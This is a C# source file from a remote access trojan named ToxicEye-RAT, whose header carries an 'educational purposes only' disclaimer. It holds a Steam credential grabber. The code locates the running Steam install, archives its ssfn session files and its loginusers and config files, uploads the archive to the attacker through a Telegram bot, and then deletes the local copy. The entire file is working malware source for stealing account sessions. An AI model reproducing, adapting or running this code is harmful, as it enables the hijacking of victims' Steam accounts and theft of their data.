/* 
       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https://github.com/LimerBoy

       > This program is distributed for educational purposes only.
*/

using System;
using System.IO;
using System.Linq;
using System.Diagnostics;
using System.IO.Compression;

namespace TelegramRAT
{
    class SteamGrabber
    {

        public static void get()
        {

            string steamPath;
            // Try get Stean path by process
            Process[] process = Process.GetProcessesByName("Steam");
            if (process.Length > 0)
            {
                // Locate steam path
                steamPath = Path.GetDirectoryName(process[0].MainModule.FileName) + "\\";
                string archivePath = Path.GetDirectoryName(config.InstallPath) + "\\steam.zip";
                // Check
                Console.WriteLine(steamPath);
                string[] a = Directory.GetFiles(steamPath, "ssfn*");
                string[] b = Directory.GetFiles(steamPath, "config\\loginusers.*");
                string[] c = Directory.GetFiles(steamPath, "config\\config.*");
                // Concat
                var files = a.Concat(b).Concat(c);
                // Write data
                using (var archive = ZipFile.Open(archivePath, ZipArchiveMode.Create))
                {
                    foreach (var file in files)
                    {
                        // Archive file
                        archive.CreateEntryFromFile(file, file);
                    }
                }
                // Send
                telegram.sendFile(archivePath);
                // Delete
                File.Delete(archivePath);
            } else
            {
                telegram.sendText("🛠 Steam process not running..");
            }
        }

            

    }
}
